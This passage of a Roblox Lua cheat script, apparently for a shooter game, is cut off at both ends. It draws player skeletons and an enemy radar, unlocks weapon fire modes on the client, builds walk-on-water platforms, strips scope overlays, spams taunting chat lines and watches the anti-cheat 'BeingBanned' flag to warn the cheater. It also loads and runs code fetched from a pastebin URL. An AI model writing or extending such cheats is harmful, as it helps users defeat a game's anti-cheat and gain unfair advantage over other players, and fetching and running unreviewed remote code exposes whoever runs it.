                    end
                    if game.Players:FindFirstChild(plr.Name) == nil then 
                        for i, v in pairs(limbs) do
                            v:Remove()
                        end
                        connection:Disconnect()
                    end
                end
            else
                if limbs.Head_UpperTorso.Visible ~= false then
                    Visibility(false)
                end
            end
        end)
    end

    local function UpdaterR6()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if isESPEnabled then
                if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                    local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                    if vis then
                        local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                        if limbs.Head_Spine.From ~= Vector2.new(H.X, H.Y) then
                            local T_Height = plr.Character.Torso.Size.Y/2 - 0.2
                            local UT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, T_Height, 0)).p)
                            local LT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -T_Height, 0)).p)

                            local LA_Height = plr.Character["Left Arm"].Size.Y/2 - 0.2
                            local LUA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, LA_Height, 0)).p)
                            local LLA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -LA_Height, 0)).p)
                            local LH = Camera:WorldToViewportPoint(plr.Character["Left Arm"].Position)

                            local RA_Height = plr.Character["Right Arm"].Size.Y/2 - 0.2
                            local RUA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, RA_Height, 0)).p)
                            local RLA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -RA_Height, 0)).p)
                            local RH = Camera:WorldToViewportPoint(plr.Character["Right Arm"].Position)

                            local LL_Height = plr.Character["Left Leg"].Size.Y/2 - 0.2
                            local LUL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, LL_Height, 0)).p)
                            local LLL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -LL_Height, 0)).p)
                            local LF = Camera:WorldToViewportPoint(plr.Character["Left Leg"].Position)

                            local RL_Height = plr.Character["Right Leg"].Size.Y/2 - 0.2
                            local RUL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, RL_Height, 0)).p)
                            local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)
                            local RF = Camera:WorldToViewportPoint(plr.Character["Right Leg"].Position)

                            --Head
                            limbs.Head_Spine.From = Vector2.new(H.X, H.Y)
                            limbs.Head_Spine.To = Vector2.new(UT.X, UT.Y)

                            --Spine
                            limbs.Spine.From = Vector2.new(UT.X, UT.Y)
                            limbs.Spine.To = Vector2.new(LT.X, LT.Y)

                            -- Left Arm
                            limbs.LeftArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.LeftArm.To = Vector2.new(LUA.X, LUA.Y)

                            limbs.LeftArm_UpperTorso.From = Vector2.new(LUA.X, LUA.Y)
                            limbs.LeftArm_UpperTorso.To = Vector2.new(LLA.X, LLA.Y)

                            limbs.LeftArm_UpperTorso.To = Vector2.new(LH.X, LH.Y)

                            -- Right Arm
                            limbs.RightArm.From = Vector2.new(UT.X, UT.Y)
                            limbs.RightArm.To = Vector2.new(RUA.X, RUA.Y)

                            limbs.RightArm_UpperTorso.From = Vector2.new(RUA.X, RUA.Y)
                            limbs.RightArm_UpperTorso.To = Vector2.new(RLA.X, RLA.Y)

                            limbs.RightArm_UpperTorso.To = Vector2.new(RH.X, RH.Y)

                            -- Left Leg
                            limbs.LeftLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.LeftLeg.To = Vector2.new(LUL.X, LUL.Y)

                            limbs.LeftLeg_LowerTorso.From = Vector2.new(LUL.X, LUL.Y)
                            limbs.LeftLeg_LowerTorso.To = Vector2.new(LLL.X, LLL.Y)

                            limbs.LeftLeg_LowerTorso.To = Vector2.new(LF.X, LF.Y)

                            -- Right Leg
                            limbs.RightLeg.From = Vector2.new(LT.X, LT.Y)
                            limbs.RightLeg.To = Vector2.new(RUL.X, RUL.Y)

                            limbs.RightLeg_LowerTorso.From = Vector2.new(RUL.X, RUL.Y)
                            limbs.RightLeg_LowerTorso.To = Vector2.new(RLL.X, RLL.Y)

                            limbs.RightLeg_LowerTorso.To = Vector2.new(RF.X, RF.Y)
                        end

                        if limbs.Head_Spine.Visible ~= true then
                            Visibility(true)
                        end
                    else 
                        if limbs.Head_Spine.Visible ~= false then
                            Visibility(false)
                        end
                    end
                else 
                    if limbs.Head_Spine.Visible ~= false then
                        Visibility(false)
                    end
                    if game.Players:FindFirstChild(plr.Name) == nil then 
                        for i, v in pairs(limbs) do
                            v:Remove()
                        end
                        connection:Disconnect()
                    end
                end
            else
                if limbs.Head_Spine.Visible ~= false then
                    Visibility(false)
                end
            end
        end)
    end

    if R15 then 
        UpdaterR15()
    else 
        UpdaterR6()
    end
end

local jesusEnabled = false
local jesusFolder = workspace:FindFirstChild("JesusFolder") or Instance.new("Folder", workspace)
jesusFolder.Name = "JesusFolder"

local function onJesusToggle(enabled)
    jesusEnabled = enabled

    -- If disabled, clear the platforms and stop the function
    if not jesusEnabled then
        for _, v in pairs(jesusFolder:GetChildren()) do
            v:Destroy()
        end
        return
    end

    -- Continuously check and create platforms if enabled
    while jesusEnabled do
        task.wait(0.1)

        local player = game.Players.LocalPlayer
        local character = player.Character

        if not character then
            continue
        end

        local head = character:FindFirstChild("Head")
        if not head then continue end

        local rayOrigin = head.Position + Vector3.new(0, 150, 0) + workspace.CurrentCamera.CFrame.LookVector * 5
        local rayDirection = Vector3.new(0, -300, 0)
        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        rayParams.FilterDescendantsInstances = {character}

        local rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

        if rayResult and rayResult.Material == Enum.Material.Water then
            local platform = Instance.new("Part")
            platform.Size = Vector3.new(500, 1, 500)
            platform.Anchored = true
            platform.CanCollide = true
            platform.Position = rayResult.Position + Vector3.new(0, 0.3, 0) -- Slightly above water surface
            platform.Material = Enum.Material.ForceField
            platform.Parent = jesusFolder
        end
    end
end


local Utility = {
    Drawings = { };
    Objects = { };
    BindToRenders = { };
    Fonts = { }
}



local autoFireEnabled = false -- Initially disabled
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer



local Lighting = game:GetService("Lighting")


local tracersEnabled = false -- Initial state of tracers
local varsglobal = {
    visuals = {
        font = 1,
        gradientenabled = false,
        gradientcolor1 = Color3.fromRGB(90, 90, 90),
        gradientcolor2 = Color3.fromRGB(150, 150, 150),
        oldgradient1 = Lighting.Ambient,
        oldgradient2 = Lighting.OutdoorAmbient,
        FogEnabled = false,
        oldFogStart = Lighting.FogStart,
        oldFogEnd = Lighting.FogEnd,
        oldFogColor = Lighting.FogColor,
        FogStart = 0,
        FogEnd = 0,
        FogColor = Color3.fromRGB(255, 255, 255),
        oldTime = Lighting.ClockTime,
        Time = 14,
        FovChanger = false,
        FovAdd = 0,
        OldFov = workspace.CurrentCamera.FieldOfView,
        ZoomAmt = 0,
        FovZoom = false,
    },
    cursor = {
        Enabled = false,
        CustomPos = false,
        Position = Vector2.new(0, 0),
        Speed = 5,
        Radius = 25,
        Color = Color3.fromRGB(180, 50, 255),
        Thickness = 1.7,
        Outline = false,
        Resize = false,
        Dot = false,
        Gap = 10,
        TheGap = false,
        Text = {
            Logo = false,
            LogoColor = Color3.new(1, 1, 1),
            Name = false,
            NameColor = Color3.new(1, 1, 1),
            LogoFadingOffset = 0,
        }
    },
    thirdperson = false,
    thirdpdist = 0,
    speenx = 0,
    speeny = 0,
    speenz = 0,
    tpwalkspeed = 0,
    spin = false,
    spinspeed = 0,
    infJumpDebounce = false,
    spamsettings = {
        speed = 0,
        num = 1,
        enabled = false,
        emojis = false,
        symb = false,
        symbols = { "$", "\"", "/", "%", "&", "_", "^", ">", "[", "]", ":", "™" },
        real = {
            [1] = {
                "\240\159\152\142", --"😎",
                "\240\159\152\136", --"😈",
                "\240\159\164\145", --"🤑",
                "\240\159\152\173", --"😭",
                "\240\159\164\175", --"🤯",
                "\240\159\165\182", --"🥶",
                "\240\159\152\177", --"😱",
                "\240\159\152\161", --"😡",
                "\240\159\152\130", --"😂",
                "\240\159\166\134", --"🦆",
                "\226\153\191"      --"♿"
            },
            [2] = {
                "be a doge",
                "Dont Use Cheats FR!",
                "🤡",
                "Cheating In This Lego Game?",
                "skibidi better than gen z",
		"OMG SO EASY!!!11!",
		"Hmm Bypass Cheat??!",
		"Cmonn so badd",
		"why not?1!1",
		"skibidi sigma rizzz",
		"BBC?? Trash",
		"Get A Life Kiddos!1",
		"Hm Trash Loot",
		"I am a sigma and you're not",
                "erm.. what the sigma",
                "no free scripts? :(",
            }
        },
        customword = "",
        customwordenabled = false,
        chatchannelpatch = "Global",
        chatlenghtpatch = 100,
    }
}

--- Lighting shits world
-- Define necessary services

local TweenService = game:GetService("TweenService")


-- Create a BlurEffect
local blurEffect = Instance.new("BlurEffect")
blurEffect.Size = 0  -- Start with no blur
blurEffect.Parent = Lighting

-- Function to toggle blur smoothly
local function toggleBlur()
    local targetSize = blurEffect.Size > 0 and 0 or 25  -- Toggle between blur and no blur
    local tween = TweenService:Create(blurEffect, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize})
    tween:Play()
    wait(0.3)
end
    local UserInputService = game:GetService("UserInputService")
-- Detect when the RightShift key is pressed to toggle the blur effect
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent and input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.RightShift then  -- Check if RightShift is pressed
            toggleBlur()  -- Call the toggle function
		wait(1)			
        end
    end
end)

toggleBlur()


local isFiring = false


-- Function to toggle tracers on and off
function Utility:ToggleTracers(enable)
    tracersEnabled = enable
end

-- Function to check for ViewModel in the Camera
function Utility:HasViewModel()
    return workspace:FindFirstChild("Camera") and workspace.Camera:FindFirstChild("ViewModel") ~= nil
end

-- Function to create bullet tracers with gradual transparency fading and decals on all sides
function Utility:CreateBullets(Position, From)
    if not tracersEnabled or not self:HasViewModel() then
        return -- Do nothing if tracers are disabled or there's no ViewModel
    end

    local direction = (Position - From).unit -- Calculate the direction vector

    local BulletTracers = Instance.new("Part")
    BulletTracers.Anchored = true
    BulletTracers.CanCollide = false
    BulletTracers.Material = Enum.Material.ForceField
    BulletTracers.Color = Color3.fromRGB(119, 120, 255)
    BulletTracers.Size = Vector3.new(0.1, 0.1, (From - Position).magnitude)
    BulletTracers.CFrame = CFrame.new(From, Position) * CFrame.new(0, 0, -BulletTracers.Size.Z / 2)
    BulletTracers.Name = "BulletTracers"
    BulletTracers.Transparency = 0
    BulletTracers.Parent = game.Workspace.NoCollision

    -- Function to add decals to all sides of the part
    local function addDecal(face)
        local decal = Instance.new("Decal")
        decal.Texture = "rbxassetid://7151778311"
        decal.Face = face
        decal.Transparency = 0
        decal.Parent = BulletTracers
    end

    -- Add decals to each face of the part
    addDecal(Enum.NormalId.Front)
    addDecal(Enum.NormalId.Back)
    addDecal(Enum.NormalId.Top)
    addDecal(Enum.NormalId.Bottom)
    addDecal(Enum.NormalId.Left)
    addDecal(Enum.NormalId.Right)

    -- Gradually fade the tracer out, including the decals
    for i = 0, 1, 0.05 do
        BulletTracers.Transparency = i
        for _, decal in ipairs(BulletTracers:GetChildren()) do
            if decal:IsA("Decal") then
                decal.Transparency = i
            end
        end
        wait(0.1) -- Adjust for faster or slower fading
    end
    
    BulletTracers:Destroy()
end

-- Function to fire the weapon
function FireWeapon()
    local gunPosition = game.Players.LocalPlayer.Character.Head.Position -- Replace with the actual gun position
    local mouse = game.Players.LocalPlayer:GetMouse()
    local hitPosition = mouse.Hit.p -- Get the mouse hit position

    -- Call the CreateBullets function
    Utility:CreateBullets(hitPosition, gunPosition)
end

-- Detect when the mouse button is pressed
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = true

        -- Continuously fire while holding down the button
        spawn(function()
            while isFiring do
                FireWeapon()
                wait(0.1) -- Adjust this delay to control the firing rate
            end
        end)
    end
end)

-- Detect when the mouse button is released
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = false
    end
end)
-- Variables

-- Services

-- Check if character exists and get the Neck position
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Neck = Character:WaitForChild("HumanoidRootPart")

-- Beam image ID
local BeamImageId = "rbxassetid://7151778302"

-- Toggle variable
local isToggleEnabled = false

-- Function to create a transparent part
local function createPart(position)
    local part = Instance.new("Part")
    part.Size = Vector3.new(1, 1, 1) -- You can adjust the size
    part.Position = position
    part.Anchored = true
    part.CanCollide = false
    part.Transparency = 1
    part.Parent = workspace
    return part
end

-- Function to create a beam between two parts
local function createBeam(startPart, endPart)
    local beam = Instance.new("Beam")
    beam.Texture = BeamImageId
    beam.FaceCamera = true
    beam.Width0 = 4.5 -- Adjust width as needed
    beam.Width1 = 4.5 -- Adjust width as needed
    beam.Parent = startPart

    local attachment0 = Instance.new("Attachment", startPart)
    local attachment1 = Instance.new("Attachment", endPart)

    beam.Attachment0 = attachment0
    beam.Attachment1 = attachment1

    return beam -- Return the beam for later use
end

-- Function to destroy parts smoothly
local function destroySmoothly(part, duration)
    local tween = TweenService:Create(part, TweenInfo.new(duration), { Transparency = 1 })
    tween:Play()

    tween.Completed:Wait() -- Wait for the tween to finish
    part:Destroy() -- Destroy the part after fading out
end

-- Click event to create parts and the beam
local function onClick()
    if not isToggleEnabled then return end -- Check if the toggle is enabled

    -- Check for ViewModel existence
    local viewModel = Camera:FindFirstChild("ViewModel")
    if not viewModel then
        print("ViewModel not found. Cannot create beams.")
        return -- Exit if ViewModel is not found
    end

    -- Create the first part at the character's neck
    local neckPart = createPart(Neck.Position)

    -- Calculate the position for the second part
    local clickDirection = Camera.CFrame.LookVector * 120 -- Adjust distance as needed
    local secondPartPosition = neckPart.Position + clickDirection
    local secondPart = createPart(secondPartPosition)

    -- Create the beam between the two parts
    createBeam(neckPart, secondPart)

    -- Start the smooth destruction after 3 seconds
    task.delay(3, function()
        destroySmoothly(neckPart, 1) -- Fade out neck part over 1 second
        destroySmoothly(secondPart, 1) -- Fade out second part over 1 second
    end)
end

-- Function to toggle the creation feature
local function toggleCreation()
    isToggleEnabled = not isToggleEnabled -- Toggle the state
    if isToggleEnabled then
        print("Enabled tracers")
    else
        print("Disabled tracers")
    end
end

-- Connect the mouse click to the function
local mouse = LocalPlayer:GetMouse()
mouse.Button1Down:Connect(onClick)

-- Add a toggle for the tracers in the UI
LeftGroupBox:AddToggle('tracers', {
    Text = 'Tracers',
    Tooltip = 'Toggle tracers on or off',
    Default = isToggleEnabled, -- Initialize with the current state
    Callback = function(enabled)
       toggleCreation() -- Call the toggle function
    end
})

-- Key binding for toggling the creation (e.g., pressing 'T')
-- You can uncomment this section to use key binding for toggling
-- local UserInputService = game:GetService("UserInputService")
-- UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
--     if gameProcessedEvent then return end -- Ignore if the game already processed the input
--     if input.KeyCode == Enum.KeyCode.T then
--         toggleCreation()
--     end
-- end)

--ban detector initialize

------------------------
-- Ban detector initialize

-- Define LocalPlayer for easier access

-- Run a loop every 4 seconds to check the 'BeingBanned' status
-- Ban detector initialize

-- Define LocalPlayer for easier access


-- Create a function for ban detection
local function detectBan()
    while true do
        wait(4) -- Wait 4 seconds before the next check

        -- Check if the UAC and BeingBanned attribute exist
        local playerStatus = game.ReplicatedStorage.Players:FindFirstChild(LocalPlayer.Name)
        
        if playerStatus and playerStatus:FindFirstChild("Status") and playerStatus.Status:FindFirstChild("UAC") then
            -- Check if the 'BeingBanned' attribute exists
            local beingBanned = playerStatus.Status.UAC:GetAttribute("BeingBanned")
            
            -- If BeingBanned is true, print a message
            if beingBanned == true then
                print("You are being banned!")
                Library:Notify("[UAC] YOU ARE GOING TO GET BANNED.")
            end
        else
        Library:Notify("[UAC] UAC VARIABLE ERROR.")
            warn("Could not find the UAC status for the player.")
        end
    end
end

-- Start the ban detection coroutine
coroutine.wrap(detectBan)()
Library:Notify("[UAC] BAN DETECTOR STARTED!")


-- Zoom functionality



local zoomValue = 0 -- Default zoom value
local defaultFOV = Camera.FieldOfView -- Get the current FOV from the camera
local zoomKey = Enum.KeyCode.Z -- Default keybind

-- Function to apply zoom based on zoom value
local function applyZoom()
    Camera.FieldOfView = defaultFOV - (zoomValue * 10) -- Adjust FOV based on zoom value
end

Esptab3:AddSlider('jump', {
    Text = 'Jump Slider',
    Default = 3.2,
    Min = 0,
    Max = 5,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        -- Get the player's character and humanoid
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

        -- Adjust JumpHeight based on the slider value
        -- Multiply Value to make it match desired jump power range
        humanoid.JumpHeight = Value -- Adjust multiplier as necessary
    end
})


-- Slider for Zoom Value
LeftGroupBox:AddSlider('ZoomSlider', {
    Text = 'Zoom Value',
    Default = 0,
    Min = 0.1,
    Max = 9,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        zoomValue = Value
        -- Apply zoom every time the slider changes
        applyZoom() -- Apply zoom immediately when the slider is adjusted
    end
})

-- Keybind for Zoom
LeftGroupBox:AddLabel('Zoom Bind'):AddKeyPicker('ZoomKeyPicker', {
    Default = 'Z',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Zoom Keybind',
    
    Callback = function(value)
        print('[cb] Keybind clicked!', value)
    end,

    ChangedCallback = function(newKey)
        zoomKey = newKey -- Update the zoom key when a new key is selected
        print('[cb] Keybind changed!', newKey)
    end
})

-- Variable to track zoom state
local isZoomed = false

-- Function to handle input for zooming
local function onKeyPress(input, gameProcessed)
    if gameProcessed then return end -- Prevent if the input is processed by the game

    -- Check if the input is the zoom key
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == zoomKey then
        isZoomed = not isZoomed -- Toggle zoom state
        if isZoomed then
            applyZoom() -- Apply zoom when enabled
        else
            Camera.FieldOfView = defaultFOV -- Reset to default FOV when disabled
        end
    end
end

-- Connect the key press event
UserInputService.InputBegan:Connect(onKeyPress)

-- Ensure zoom is applied when the slider is adjusted
UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == zoomKey then
        if isZoomed then
            applyZoom() -- Reapply zoom if the key is currently held down
        end
    end
end)
        local player = game.Players.LocalPlayer
-- Path to the ReplicatedStorage and Player's inventory
local replicatedStorage = game:GetService("ReplicatedStorage")

local playerInventoryPath = replicatedStorage.Players:WaitForChild(player.Name, 5) -- 10 saniye bekler

-- Table to keep track of processed items
local processedItems = {}
local inventoryChecking = false -- Başlangıçta kontrol işlemi durdurulmuş durumda

-- Function to unlock and change fire modes for a specific weapon
local function unlockFireModes(weapon)
    local settingsModule = weapon:FindFirstChild("SettingsModule")
    if settingsModule then
        local weaponSettings = require(settingsModule)
        if weaponSettings and weaponSettings.FireModes then
            -- Unlock all fire modes: Auto, Semi, and Burst
            weaponSettings.FireModes = { "Auto", "Semi", "Burst" }
            print(weapon.Name .. " fire modes unlocked: Auto, Semi, Burst")
        else
            warn(weapon.Name .. " SettingsModule or FireModes not found!")
        end
    else
        warn(weapon.Name .. " does not have a SettingsModule!")
    end
end

-- Function to check the inventory and unlock fire modes for new items
local function checkInventoryForNewItems()
    if playerInventoryPath and playerInventoryPath:FindFirstChild("Inventory") then
        local inventory = playerInventoryPath:WaitForChild("Inventory", 10)
        
        for _, weapon in pairs(inventory:GetChildren()) do
            -- If the item is not yet processed, unlock its fire modes
            if not processedItems[weapon.Name] then
                unlockFireModes(weapon)
                -- Mark the item as processed
                processedItems[weapon.Name] = true
            end
        end
    else
        warn("Player inventory not found in ReplicatedStorage!")
    end
end

-- Function to start inventory checking process
local function startInventoryCheck()
    if not inventoryChecking then
        inventoryChecking = true
        print("Inventory check started.")
        
        -- Periodically check the inventory every 10 seconds for new items
        while inventoryChecking do
            checkInventoryForNewItems()
            wait(3) -- Wait for 10 seconds before checking again
        end
    else
        print("Inventory check is already running.")
    end
end

-- Function to stop inventory checking process
local function stopInventoryCheck()
    if inventoryChecking then
        inventoryChecking = false
        print("Inventory check stopped.")
    end
end



-- Call this function when you want to start the process
-- Example: startInventoryCheck() to start checking, stopInventoryCheck() to stop it.


LeftGroupBox:AddToggle('unlckfrmodsxfrewfrwesdgfrytuı8oıuykıj67ytrhg', {
    Text = 'Unlock Fire Modes',
    Tooltip = 'Unlock Fire Modes',
    Default = false, -- Initialize with the current state
    Callback = function(enabled)
    Library:Notify("Unlocked")
startInventoryCheck()
    end
})

LeftGroupBox:AddToggle('nowaterblur', {
    Text = 'No Water Blur',
    Tooltip = 'No Blur For Water',
    Default = tracersEnabled, -- Initialize with the current state
    Callback = function(enabled)
        if enabled then
        Library:Notify("Enabled No Water Blur")
            game.Lighting.WaterBlur.Size = 0 -- If toggle is enabled, set blur to 0
        else
        Library:Notify("Disabled No Water Blur")
            game.Lighting.WaterBlur.Size = 24 -- If toggle is disabled, set blur to default (24)
        end
    end
})




LeftGroupBox:AddToggle('Experiementalsettingon', {
    Text = 'Developer Mode',
    Tooltip = '0',
    Default = tracersEnabled, -- Initialize with the current state
    Callback = function(value)
print("AA CC EE SS DD EE NN II EE DD")
Library:Notify("No")
    end
})





local RS = game:service("RunService")
local UIS = game:service("UserInputService")

repeat wait() until Player.Character ~= nil and Player.Character.PrimaryPart ~= nil

local LerpColorModule = loadstring(game:HttpGet("https://pastebin.com/raw/wRnsJeid"))()
local HealthBarLerp = LerpColorModule:Lerp(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0))

local function NewCircle(Transparency, Color, Radius, Filled, Thickness)
    local c = Drawing.new("Circle")
    c.Transparency = Transparency
    c.Color = Color
    c.Visible = false
    c.Thickness = Thickness
    c.Position = Vector2.new(0, 0)
    c.Radius = Radius
    c.NumSides = math.clamp(Radius * 55 / 100, 10, 75)
    c.Filled = Filled
    return c
end

local RadarInfo = {
    Position = Vector2.new(200, 200),
    Radius = 100,
    Scale = 1,
    RadarBack = Color3.fromRGB(10, 10, 10),
    RadarBorder = Color3.fromRGB(75, 75, 75),
    LocalPlayerDot = Color3.fromRGB(255, 255, 255),
    PlayerDot = Color3.fromRGB(60, 170, 255),
    Team = Color3.fromRGB(0, 255, 0),
    Enemy = Color3.fromRGB(255, 0, 0),
    Health_Color = true,
    Team_Check = true
}

local RadarBackground = NewCircle(0.9, RadarInfo.RadarBack, RadarInfo.Radius, true, 1)
local RadarBorder = NewCircle(0.75, RadarInfo.RadarBorder, RadarInfo.Radius, false, 3)

local function GetRelative(pos)
    local char = Player.Character
    if char and char.PrimaryPart then
        local pmpart = char.PrimaryPart
        local camerapos = Vector3.new(Camera.CFrame.Position.X, pmpart.Position.Y, Camera.CFrame.Position.Z)
        local newcf = CFrame.new(pmpart.Position, camerapos)
        local r = newcf:PointToObjectSpace(pos)
        return r.X, r.Z
    else
        return 0, 0
    end
end

local function PlaceDot(plr)
    local PlayerDot = NewCircle(1, RadarInfo.PlayerDot, 3, true, 1)
    PlayerDot.Visible = false  -- Initially hide the dot

    local function Update()
        local c
        c = RS.RenderStepped:Connect(function()
            if RadarBackground.Visible then  -- Check if radar is visible
                local char = plr.Character
                if char and char:FindFirstChildOfClass("Humanoid") and char.PrimaryPart and char:FindFirstChildOfClass("Humanoid").Health > 0 then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local scale = RadarInfo.Scale
                    local relx, rely = GetRelative(char.PrimaryPart.Position)
                    local newpos = RadarInfo.Position - Vector2.new(relx * scale, rely * scale)

                    if (newpos - RadarInfo.Position).magnitude < RadarInfo.Radius - 2 then
                        PlayerDot.Radius = 3
                        PlayerDot.Position = newpos
                        PlayerDot.Visible = true
                    else
                        local dist = (RadarInfo.Position - newpos).magnitude
                        local calc = (RadarInfo.Position - newpos).unit * (dist - RadarInfo.Radius)
                        local inside = Vector2.new(newpos.X + calc.X, newpos.Y + calc.Y)
                        PlayerDot.Radius = 2
                        PlayerDot.Position = inside
                        PlayerDot.Visible = true
                    end

                    PlayerDot.Color = RadarInfo.PlayerDot
                    if RadarInfo.Team_Check then
                        if plr.TeamColor == Player.TeamColor then
                            PlayerDot.Color = RadarInfo.Team
                        else
                            PlayerDot.Color = RadarInfo.Enemy
                        end
                    end

                    if RadarInfo.Health_Color then
                        PlayerDot.Color = HealthBarLerp(hum.Health / hum.MaxHealth)
                    end
                else
                    PlayerDot.Visible = false
                    if Players:FindFirstChild(plr.Name) == nil then
                        PlayerDot:Remove()
                        c:Disconnect()
                    end
                end
            else
                PlayerDot.Visible = false
            end
        end)
    end
    coroutine.wrap(Update)()
end

for _, v in pairs(Players:GetChildren()) do
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
end

local function NewLocalDot()
    local d = Drawing.new("Triangle")
    d.Visible = false  -- Initially hide the dot
    d.Thickness = 1
    d.Filled = true
    d.Color = RadarInfo.LocalPlayerDot
    d.PointA = RadarInfo.Position + Vector2.new(0, -6)
    d.PointB = RadarInfo.Position + Vector2.new(-3, 6)
    d.PointC = RadarInfo.Position + Vector2.new(3, 6)
    return d
end

local LocalPlayerDot = NewLocalDot()

Players.PlayerAdded:Connect(function(v)
    if v.Name ~= Player.Name then
        PlaceDot(v)
    end
    LocalPlayerDot:Remove()
    LocalPlayerDot = NewLocalDot()
end)

-- Function to update radar visibility
local function UpdateRadarVisibility(visible)
    RadarBackground.Visible = visible
    RadarBorder.Visible = visible
    LocalPlayerDot.Visible = visible
    for _, v in pairs(Players:GetChildren()) do
        if v.Name ~= Player.Name then
            local dot = v:FindFirstChild("RadarDot")
            if dot then
                dot.Visible = visible
            end
        end
    end
end

-- Add the toggle to the EnemyEspTab
if LeftGroupBox and LeftGroupBox.AddToggle then
    LeftGroupBox:AddToggle('minimap', {
        Text = 'Minimap',
        Default = false,
        Callback = function(first)
        
            UpdateRadarVisibility(first)
        end
    })
else
    warn("EnemyEspTab or AddToggle method not found")
end

-- Optional: Initialize the radar visibility based on the default toggle state
if LeftGroupBox and LeftGroupBox.GetToggleState then
    local success, toggleState = pcall(function() return LeftGroupBox:GetToggleState('minimap') end)
    if success then
        UpdateRadarVisibility(toggleState)
    else
        warn("Failed to get toggle state for 'minimap'")
    end
else
    warn("EnemyEspTab or GetToggleState method not found")
end

-- Loop
coroutine.wrap(function()
    local c
    c = RS.RenderStepped:Connect(function()
        if LocalPlayerDot then
            LocalPlayerDot.Color = RadarInfo.LocalPlayerDot
            LocalPlayerDot.PointA = RadarInfo.Position + Vector2.new(0, -6)
            LocalPlayerDot.PointB = RadarInfo.Position + Vector2.new(-3, 6)
            LocalPlayerDot.PointC = RadarInfo.Position + Vector2.new(3, 6)
        end
        RadarBackground.Position = RadarInfo.Position
        RadarBackground.Radius = RadarInfo.Radius
        RadarBackground.Color = RadarInfo.RadarBack

        RadarBorder.Position = RadarInfo.Position
        RadarBorder.Radius = RadarInfo.Radius
        RadarBorder.Color = RadarInfo.RadarBorder
    end)
end)()

-- Draggable
local inset = game:service("GuiService"):GetGuiInset()

local dragging = false
local offset = Vector2.new(0, 0)
UIS.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
        offset = RadarInfo.Position - Vector2.new(Mouse.X, Mouse.Y)
        dragging = true
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

coroutine.wrap(function()
    local dot = NewCircle(1, Color3.fromRGB(255, 255, 255), 3, true, 1)
    local c
    c = RS.RenderStepped:Connect(function()
        if (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
            dot.Position = Vector2.new(Mouse.X, Mouse.Y + inset.Y)
            dot.Visible = true
        else
            dot.Visible = false
        end
        if dragging then
            RadarInfo.Position = Vector2.new(Mouse.X, Mouse.Y) + offset
        end
    end)
end)()



-- Toggle implementation
LeftGroupBox:AddToggle('jesus', {
    Text = 'Walk On Water',
    Tooltip = 'Lets You Walk On Water',
    Default = false,

    Callback = function(value)
        onJesusToggle(value)
        Library:Notify("Walk On Water:" .. value .."")
    end
})


LeftGroupBox:AddButton('Remove Scope From Gun', function()

Library:Notify("Removed")
game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):Destroy()

 end)

LeftGroupBox:AddButton('Disable OKP7 SCOPE GUI', function()
Library:Notify("Removed")

game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):FindFirstChild("OKP7"):FindFirstChild("Reticle"):FindFirstChild("ScopeGui"):Destroy()

 end)

LeftGroupBox:AddButton('Remove Gloves From Viewmodel', function()

Library:Notify("Removed")
game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("CombatGloves"):Destroy()	

 end)
 local isCheckingVisibility = false
local textLabel = nil
local connection = nil

-- Function to create the visibility text label
local function createVisibilityText()
    if not textLabel then
